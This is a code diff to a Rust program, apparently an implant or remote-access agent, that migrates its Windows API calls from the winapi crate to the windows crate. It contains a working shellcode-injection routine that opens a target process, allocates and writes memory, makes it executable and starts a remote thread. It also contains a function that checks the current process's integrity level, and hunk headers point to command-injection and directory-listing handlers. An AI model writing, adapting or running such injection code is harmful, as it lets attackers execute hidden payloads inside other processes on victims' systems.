@@ -230,11 +230,11 @@ fn list_dir(path: &str) -> String {
 
 #[cfg(target_os = "windows")]
 fn integrity_level() -> String {
-    use std::ptr;
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
-    use winapi::um::securitybaseapi::GetTokenInformation;
-    use winapi::um::winnt::{TokenIntegrityLevel, SID, TOKEN_MANDATORY_LABEL, TOKEN_QUERY};
+    use windows::{
+        Win32::Foundation::*,
+        Win32::Security::*,
+        Win32::System::Threading::*,
+    };
 
     const LOW: u32 = 0x1000;
     const MEDIUM: u32 = 0x2000;
@@ -242,28 +242,41 @@ fn integrity_level() -> String {
     const SYSTEM: u32 = 0x4000;
 
     unsafe {
-        let mut token = ptr::null_mut();
-        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
+        let mut token = HANDLE::default();
+        if OpenProcessToken(
+            GetCurrentProcess(),
+            TOKEN_QUERY,
+            &mut token,
+        )
+        .is_err()
+        {
             return "unknown".into();
         }
 
         // First call: get required buffer size
         let mut size: u32 = 0;
-        GetTokenInformation(token, TokenIntegrityLevel, ptr::null_mut(), 0, &mut size);
+        let _ = GetTokenInformation(
+            token,
+            TOKEN_INFORMATION_CLASS::TokenIntegrityLevel,
+            None,
+            0,
+            Some(&mut size),
+        );
         let mut buf = vec![0u8; size as usize];
 
         if GetTokenInformation(
             token,
-            TokenIntegrityLevel,
-            buf.as_mut_ptr().cast(),
+            TOKEN_INFORMATION_CLASS::TokenIntegrityLevel,
+            Some(buf.as_mut_ptr().cast()),
             size,
-            &mut size,
-        ) == 0
+            Some(&mut size),
+        )
+        .is_err()
         {
-            CloseHandle(token);
+            let _ = CloseHandle(token);
             return "unknown".into();
         }
-        CloseHandle(token);
+        let _ = CloseHandle(token);
 
         // Interpret the buffer as TOKEN_MANDATORY_LABEL
         let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
@@ -308,60 +321,64 @@ fn inject_cmd(args: &str) -> String {
 
 #[cfg(target_os = "windows")]
 fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
-    use std::ptr;
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
-    use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS,
+    use windows::{
+        Win32::Foundation::*,
+        Win32::System::Memory::*,
+        Win32::System::Threading::*,
     };
 
     unsafe {
-        let proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-        if proc.is_null() {
+        let proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+        if proc.is_invalid() {
             return format!("[-] OpenProcess({}) failed", pid);
         }
 
         let addr = VirtualAllocEx(
             proc,
-            ptr::null_mut(),
+            None,
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
         if addr.is_null() {
-            CloseHandle(proc);
+            let _ = CloseHandle(proc);
             return "[-] VirtualAllocEx failed".into();
         }
 
         let mut written = 0usize;
-        WriteProcessMemory(
+        let _ = WriteProcessMemory(
             proc,
             addr,
             shellcode.as_ptr().cast(),
             shellcode.len(),
-            &mut written,
+            Some(&mut written),
         );
 
-        let mut old = 0u32;
-        VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+        let mut old = PAGE_PROTECTION_FLAGS(0);
+        let _ = VirtualProtectEx(
+            proc,
+            addr,
+            shellcode.len(),
+            PAGE_EXECUTE_READ,
+            &mut old,
+        );
 
         let thr = CreateRemoteThread(
             proc,
-            ptr::null_mut(),
+            None,
             0,
             Some(std::mem::transmute(addr)),
-            ptr::null_mut(),
+            None,
             0,
-            ptr::null_mut(),
+            None,
         );
-        if thr.is_null() {
-            CloseHandle(proc);
+        if thr.is_invalid() {
+            let _ = CloseHandle(proc);
             return "[-] CreateRemoteThread failed".into();
         }
 
-        CloseHandle(thr);
-        CloseHandle(proc);
+        let _ = CloseHandle(thr);
+        let _ = CloseHandle(proc);
         format!("[+] Injected {} bytes into PID {}", shellcode.len(), pid)
     }
 }
